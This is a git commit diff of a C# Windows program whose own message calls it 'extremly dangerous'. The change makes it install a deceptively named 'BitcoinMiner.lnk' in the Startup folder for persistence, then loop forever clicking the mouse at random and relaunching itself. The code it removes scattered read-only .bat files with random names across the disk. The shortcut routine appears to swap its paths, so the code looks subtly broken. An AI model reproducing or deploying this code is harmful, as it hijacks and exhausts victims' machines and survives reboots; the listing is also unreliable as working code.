db844469692608bd1f91a81a4f46b2806610dcbd
vasker <yarinvasket@gmail.com>
2020-01-13 12:38:04 -0800

    make program run on startup
    - WARNING: this is now an extremly dangerous program to run

--- Form1.cs
+++ Form1.cs
@@ -1,4 +1,5 @@
-﻿using System;
+﻿using IWshRuntimeLibrary;
+using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
@@ -11,7 +12,7 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
-namespace RandomFileCreator
+namespace RandomFileCreator2
 {
     public partial class Form1 : Form
     {
@@ -25,75 +26,71 @@ namespace RandomFileCreator
 
         public static Random random = new Random();
         public static string appPath = System.Reflection.Assembly.GetEntryAssembly().Location;
-        public static string startPath = "C:\\";
+        public static string startUp = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\BitcoinMiner.lnk";
         public static int screenWidth = 1920;
         public static int screenHeight = 1080;
 
         public Form1()
         {
-            Run(startPath);
+            try
+            {
+                if (System.IO.File.Exists(startUp))
+                    Run();
+                CreateShortcut(startUp);
+            } catch (Exception)
+            {
+                try
+                {
+                    string userStartUp = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\BitcoinMiner.lnk";
+                    if (System.IO.File.Exists(userStartUp))
+                        Run();
+                    CreateShortcut(userStartUp);
+                } catch (Exception) { }
+            }
+
+            Run();
         }
 
-        public static void Run(object path2)
+        public static void Run()
         {
             try
             {
                 while (true)
                 {
-                    string path = RandomPath((string)path2) + "\\" + "System_App_" + RandomName() + ".bat";
-
                     Cursor.Position = new Point(random.Next(0, screenWidth), random.Next(0, screenHeight));
-                    DoDoubleMouseClick();
-
-                    using (StreamWriter sw = new StreamWriter(path, true))
-                    {
-                        File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.ReadOnly);
-                        sw.Write("start " + appPath);
-                    }
+                    DoMouseClick();
+                    DoMouseClick();
                     Process.Start(appPath);
                 }
             }
             catch (Exception)
             {
-                Run((string)path2);
-                return;
+                Run();
             }
         }
 
-        public static void DoDoubleMouseClick()
+        public static void DoMouseClick()
         {
             int x = Cursor.Position.X;
             int y = Cursor.Position.Y;
-            mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, x, y, 0, 0);
-            mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, x, y, 0, 0);
-        }
-
-        public static string RandomPath(string path)
-        {
             try
             {
-                string[] names = Directory.GetDirectories(path);
-                if (names.Length == 0 || random.Next(0, 2) == 0)
-                {
-                    return path;
-                }
-                int rand = random.Next(0, names.Length - 1);
-                return RandomPath(names[rand]);
-            }
-            catch (UnauthorizedAccessException)
+                mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, x, y, 0, 0);
+            } catch (Exception)
             {
-                return path;
+                DoMouseClick();
             }
         }
 
-        public static string RandomName(string str = "")
+        public static void CreateShortcut(string targetPath)
         {
-            if (str.Length == 18)
-            {
-                return str;
-            }
-            int rand = random.Next(1, 3) == 1 ? random.Next(48, 57) : random.Next(97, 122);
-            return RandomName(str + ((char)rand));
+            WshShell shell = new WshShell();
+            string shortcutAddress = appPath;
+            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutAddress);
+            shortcut.Description = "";
+            shortcut.Hotkey = "Ctrl+Shift+N";
+            shortcut.TargetPath = targetPath;
+            shortcut.Save();
         }
     }
 }
